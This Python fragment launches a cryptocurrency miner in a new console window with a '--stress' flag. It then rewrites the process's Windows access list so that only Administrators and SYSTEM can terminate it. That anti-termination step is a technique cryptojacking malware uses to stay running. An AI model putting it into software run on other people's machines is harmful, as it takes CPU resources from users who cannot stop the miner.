def protect_process(pid):
    try:
        import win32security, win32api, win32process
    except ImportError:
        hawk.warning("[PROCESS_PROTECT] pywin32 not installed, skipping ACL protection")
        return
    try:
        hProcess = win32api.OpenProcess(win32process.PROCESS_SET_SECURITY, False, pid)
        admins, _, _ = win32security.LookupAccountName("", "Administrators")
        system, _, _ = win32security.LookupAccountName("", "SYSTEM")
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, admins)
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, system)
        win32security.SetSecurityInfo(hProcess, win32security.SE_KERNEL_OBJECT,
                                      win32security.DACL_SECURITY_INFORMATION,
                                      None, None, dacl, None)
        hawk.info("[PROCESS_PROTECT] only admins/system can terminate miner")
    except Exception as e:
        hawk.error(f"[PROCESS_PROTECT] failed: {e}")

def start_miner(exe_path, config_dir):
    hawk.info(f"[MINER] launching {exe_path} in a new console window with --stress mode")
    try:
        size = os.path.getsize(exe_path)
        hawk.debug(f"[MINER] About to launch file: {exe_path} (size: {size})")
    except:
        pass
    try:
        # Use --stress to force CPU usage immediately, run in a visible console
        proc = subprocess.Popen(
            [exe_path, "--stress"],
            cwd=os.path.dirname(exe_path),
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        protect_process(proc.pid)
        hawk.info(f"[MINER] PID {proc.pid}")
        return proc
    except Exception as e:
        hawk.error(f"[MINER] failed to start: {e}", exc_info=True)
        return None

